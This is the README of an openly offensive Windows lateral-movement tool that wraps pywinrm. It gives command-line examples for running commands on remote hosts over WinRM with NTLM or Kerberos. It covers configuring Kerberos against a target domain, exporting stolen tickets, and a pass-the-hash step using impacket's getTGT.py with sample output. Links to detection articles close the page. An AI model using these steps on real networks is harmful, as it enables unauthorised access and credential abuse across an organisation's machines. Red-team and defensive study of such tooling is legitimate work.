# wunderthunder

A lateral movement tool based on pywinrm. Requires local administrator
privileges and winrm to be enabled on the endpoint you are targeting.

NOTE: Tested with Python 3.11.4 on MacOS and Linux.

## About

wunderthunder.py - Perform lateral movement via winrm using the pywinrm
library. Currently supports NTLM and Kerberos authentication.

## Installation

Read installation instructions: https://github.com/diyan/pywinrm#installation

## Usage - wunderthunder.py

Please see the tool's help menu below:

```
python wunderthunder.py -h
usage: wunderthunder.py [-h] [-o FILENAME_PREPEND] -u USERNAME -c COMMAND -t TRANSPORT
                        (-p PASSWORD | -P | -k KEYTAB) (-l SERVER | -lf SERVERLIST)

Lateral movement with pyWinRM

options:
  -h, --help            show this help message and exit
  -o FILENAME_PREPEND, --output FILENAME_PREPEND
                        Prepend a string to all output file names
  -p PASSWORD, --password PASSWORD
                        Password to authenticate with
  -P, --prompt          Prompt for the password
  -k KEYTAB, --keytab KEYTAB
                        Absolute/relative path to a keytab file (required if "--transport
                        kerberos")
  -l SERVER, --server SERVER
                        FQDN of server to run commands on
  -lf SERVERLIST, --serverList SERVERLIST
                        File containing FQDN of server(s) to run commands on separated by
                        newline

Server parameters:
  -u USERNAME, --username USERNAME
                        Username to authenticate with in USERNAME@DOMAIN format
  -c COMMAND, --command COMMAND
                        Command to run against winrm endpoint
  -t TRANSPORT, --transport TRANSPORT
                        Transport type, either ntlm/kerberos
```

## Example - wunderthunder.py

Please see some examples below:

### NTLM authentication with clear-text password

```
python wunderthunder.py -u 'USERNAME@DOMAIN' -p 'PASSWORD' -t ntlm -c 'whoami' -l 'HOSTNAME in FQDN format'
```

```
python wunderthunder.py -u 'USERNAME@DOMAIN' -p 'PASSWORD' -t ntlm -c 'whoami' -lf file-containing-hostnames-in-fqdn-format.txt
```

### Kerberos authentication with TGT

Unlike NTLM, Kerberos authentication requires a bit of preparation that needs
to be performed before invoking wunderthunder.py:

- Modify /etc/krb5.conf and set 'default_realm' to FQDN of the domain you are
  attacking.
- (Optional) Modify /etc/hosts to include hosts that have a different Kerberos
  hostname than the domain you are attacking. This is how
  your /etc/host should look like:

```
--SNIP
<DC IP>                 <FQDN of domain you are attacking>
<Kerberos host IP>      <FQDN of host with its correct Kerberos hostname>
--SNIP
```

- Finally, export KRB5CCNAME environment variable with the stolen ticket/keytab
  file e.g:

```
export KRB5CCNAME=kerbtix
```

```
python wunderthunder.py -u 'USERNAME@DOMAIN' -k kerbtix -t kerberos -c 'whoami' -l 'HOSTNAME in FQDN format'
```

```
python wunderthunder.py -u 'USERNAME@DOMAIN' -k kerbtix -t kerberos -c 'whoami' -lf file-containing-hostnames-in-fqdn-format.txt
```

### Kerberos authentication with NTLM hash

You can utilize impacket's getTGT.py to create a Kerberos TGT from NTLM hash:

```
python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Saving ticket in user.ccache
```

Make a copy of that ticket and set KRB5CCNAME environment variable
to the ticket location:

```
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
```

Finally, you can invoke wunderthunder.py as normal.

## Detection

Refer:

- https://redcanary.com/blog/lateral-movement-winrm-wmi/
- https://in.security/2021/05/03/detecting-lateral-movement-via-winrm-using-kql/

## Credits

wunderthunder.py is pretty much a glorified `for` loop wrapper built around the
pywinrm library. So thank their devs for creating an excellent library.

Refer:

- https://github.com/diyan/pywinrm

